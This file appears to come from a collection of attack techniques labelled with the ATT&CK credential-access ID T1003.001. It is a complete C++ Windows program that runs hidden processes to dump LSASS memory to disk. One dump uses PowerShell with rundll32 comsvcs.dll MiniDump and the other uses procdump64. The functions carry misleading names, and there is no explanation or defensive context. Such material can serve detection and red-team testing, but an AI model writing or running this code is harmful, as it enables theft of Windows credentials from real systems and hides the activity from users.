---
title: "T1003.001.LSASS Memory"
folder: "08. Credential Access"
---





#include <windows.h>
#include <fstream>
#include <iostream>


void AutorunRegistryBackground4() {

    const char* command = "powershell.exe -Command \"$lsassPID = Get-Process lsass | Select-Object -ExpandProperty Id; if ($lsassPID) { $dumpFilePath = 'C:\\Users\\User\\Desktop\\lsass.dmp'; $null = rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $lsassPID $dumpFilePath full }\"";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void AutorunRegistryBackground5() {

    const char* command = "C:\\Users\\User\\Desktop\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\User\\Desktop\\lsassPROC.dmp";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    AutorunRegistryBackground4();
    AutorunRegistryBackground5();
    return 0;
}